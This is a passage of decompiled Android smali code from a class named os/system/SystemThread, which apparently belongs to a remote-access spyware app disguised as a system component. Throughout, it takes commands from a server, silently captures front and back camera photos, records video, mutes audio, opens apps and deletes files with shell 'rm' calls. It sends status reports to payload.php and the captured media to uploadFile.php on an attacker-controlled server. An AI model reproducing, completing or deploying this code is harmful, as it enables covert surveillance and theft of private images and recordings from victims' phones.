    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto/16 :goto_0

    .line 184
    :cond_d
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "sedang menginstall..."

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 185
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    const-string v3, "server"

    const-string v4, "aktif"

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 186
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->seteditor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto/16 :goto_1

    .line 216
    :cond_e
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Los/system/ReceiverBoot;->setServer(Z)Ljava/lang/String;

    move-result-object v2

    goto/16 :goto_2

    .line 249
    :catch_0
    move-exception v2

    .line 251
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "screenshoot gagal"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    .line 260
    :cond_f
    const/4 v3, 0x1

    :try_start_8
    aget-object v2, v2, v3

    const-string v3, "mati"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_a

    .line 261
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v2, 0x0

    move-object/from16 v0, p1

    invoke-static {v2, v0}, Los/system/ReceiverBoot;->setGSM(ZLandroid/content/Context;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    goto/16 :goto_4

    .line 263
    :catch_1
    move-exception v2

    goto/16 :goto_4

    .line 282
    :cond_10
    :try_start_9
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const/4 v4, 0x1

    aget-object v4, v2, v4

    const/4 v5, 0x2

    aget-object v2, v2, v5

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v2}, Los/system/ReceiverBoot;->audio(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 283
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "audio dimatikan"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_2

    goto/16 :goto_6

    .line 285
    :catch_2
    move-exception v2

    goto/16 :goto_6

    .line 298
    :catch_3
    move-exception v2

    .line 299
    :try_start_a
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "install bukan dari assets"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_4

    goto/16 :goto_7

    .line 306
    :catch_4
    move-exception v2

    goto/16 :goto_8

    .line 320
    :cond_11
    :try_start_b
    invoke-virtual {v8, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 322
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v5, "/payload.php?outpayload="

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 324
    invoke-interface {v4}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_b

    .line 325
    sget-object v2, Los/system/SystemThread;->TAG:Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5

    .line 348
    :goto_a
    :try_start_c
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-foto-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 349
    new-instance v3, Los/system/CamRuntime;

    invoke-direct {v3}, Los/system/CamRuntime;-><init>()V

    .line 350
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    sput-object v3, Los/system/CamRuntime;->path:Ljava/lang/String;

    .line 352
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "depan"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_12

    .line 353
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "rm "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    move-object/from16 v0, p0

    iget-object v5, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v5, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "/foto.jpg"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 355
    const-string v3, "depan"

    move-object/from16 v0, p1

    invoke-static {v0, v3}, Los/system/CamRuntime;->capturePhoto(Landroid/content/Context;Ljava/lang/String;)V

    .line 356
    const-wide/16 v4, 0x7d0

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    .line 358
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/uploadFile.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 359
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const-string v3, "upload"

    sput-object v3, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 360
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/foto.jpg"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    sput-object v3, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 361
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v3, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 364
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "kamera sukses sedang mengupload"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v3, v4}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 367
    :cond_12
    const/4 v3, 0x1

    aget-object v2, v2, v3

    const-string v3, "back"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_13

    .line 368
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "rm "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, p0

    iget-object v4, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v4, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/foto.jpg"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    .line 370
    const-string v2, "back"

    move-object/from16 v0, p1

    invoke-static {v0, v2}, Los/system/CamRuntime;->capturePhoto(Landroid/content/Context;Ljava/lang/String;)V

    .line 371
    const-wide/16 v2, 0x7d0

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V

    .line 373
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/uploadFile.php"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 374
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    const-string v2, "upload"

    sput-object v2, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 375
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/foto.jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    sput-object v2, Los/system/ReceiverBoot;->requestPath:Ljava/lang/String;

    .line 376
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    move-object/from16 v0, p1

    invoke-virtual {v2, v0}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 379
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v3, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/payload.php?outpayload="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "kamera back sukses sedang mengupload"

    move-object/from16 v0, p0

    invoke-virtual {v0, v3}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_15

    .line 385
    :cond_13
    :goto_b
    :try_start_d
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-cam-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 386
    new-instance v3, Los/system/CamRuntime;

    invoke-direct {v3}, Los/system/CamRuntime;-><init>()V

    .line 387
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    sput-object v3, Los/system/CamRuntime;->path:Ljava/lang/String;
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_7

    .line 390
    const/4 v3, 0x3

    :try_start_e
    aget-object v3, v2, v3

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    .line 391
    sput v3, Los/system/SystemThread;->jcamera:I

    .line 392
    sget-object v4, Los/system/SystemThread;->TAG:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "jcamera:"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v4, v3}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 395
    const/4 v3, 0x2

    aget-object v3, v2, v3

    const-string v4, "1"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_14

    const/4 v3, 0x1

    sput v3, Los/system/CamRuntime;->kualitas:I
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_14

    .line 399
    :cond_14
    :goto_c
    const/4 v3, 0x2

    :try_start_f
    aget-object v3, v2, v3

    const-string v4, "1"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_15

    const/4 v3, 0x1

    sput v3, Los/system/CamRuntime;->kualitas:I
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_13

    .line 402
    :cond_15
    :goto_d
    const/4 v3, 0x1

    :try_start_10
    aget-object v3, v2, v3

    const-string v4, "depan"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1e

    .line 403
    new-instance v2, Landroid/content/Intent;

    const-class v3, Los/system/CamRuntime;

    move-object/from16 v0, p1

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 404
    move-object/from16 v0, p1

    invoke-virtual {v0, v2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 406
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->camServiceConeksi:Landroid/content/ServiceConnection;

    const/4 v4, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2, v3, v4}, Los/system/SystemThread;->bindService(Landroid/content/Intent;Landroid/content/ServiceConnection;I)Z

    .line 415
    :cond_16
    :goto_e
    move-object/from16 v0, p0

    iget-object v2, v0, Los/system/SystemThread;->camHandler:Landroid/os/Handler;

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->camRefresh:Ljava/lang/Runnable;

    const-wide/16 v4, 0x1388

    invoke-virtual {v2, v3, v4, v5}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_7

    .line 420
    :goto_f
    :try_start_11
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-app-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 421
    new-instance v3, Los/system/MainActivity;

    invoke-direct {v3}, Los/system/MainActivity;-><init>()V

    const/4 v4, 0x1

    aget-object v4, v2, v4

    const-string v5, "open"

    move-object/from16 v0, p1

    invoke-virtual {v3, v0, v4, v5}, Los/system/MainActivity;->apkMana(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1f

    .line 423
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "APK:"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const/4 v5, 0x1

    aget-object v2, v2, v5

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, " berhasil dibuka"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    invoke-virtual {v0, v1, v2, v3}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_8

    .line 435
    :goto_10
    :try_start_12
    sget-object v2, Los/system/SystemThread;->payloadWebResult:Ljava/lang/String;

    const-string v3, "-up-"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 436
    const-string v3, ""

    .line 438
    const/4 v3, 0x1

    aget-object v3, v2, v3

    const-string v4, "video"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_20

    .line 439
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    sget-object v3, Los/system/ReceiverBoot;->pathExternal:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "/REC_SYSTEM.mp4"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 441
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Los/system/SystemThread;->urlServer:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "/payload.php?outpayload="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "upload video TUNGGU"

    move-object/from16 v0, p0

    invoke-virtual {v0, v4}, Los/system/SystemThread;->textPayload(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v4, "null"

    move-object/from16 v0, p0

    move-object/from16 v1, p0

    invoke-virtual {v0, v1, v3, v4}, Los/system/SystemThread;->reqPayload(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 457
    :goto_11
    move-object/from16 v0, p0

    iget-object v3, v0, Los/system/SystemThread;->receAction:Los/system/ReceiverBoot;

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

